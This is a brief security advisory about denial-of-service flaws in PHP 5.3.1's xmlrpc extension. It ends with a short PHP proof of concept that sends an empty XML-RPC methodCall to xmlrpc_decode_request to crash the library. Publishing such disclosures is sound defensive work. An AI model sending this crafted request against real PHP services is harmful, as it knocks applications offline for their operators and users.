source: http://www.securityfocus.com/bid/38708/info

PHP's xmlrpc extension library is prone to multiple denial-of-service vulnerabilities because it fails to properly handle crafted XML-RPC requests.

Exploiting these issues allows remote attackers to cause denial-of-service conditions in the context of an application using the vulnerable library.

PHP 5.3.1 is vulnerable; other versions may also be affected. 

<?php
$req = '<?xml version="1.0"?>
<methodCall>
   </methodCall>';
    $result = xmlrpc_decode_request( $req, $frop );
?>
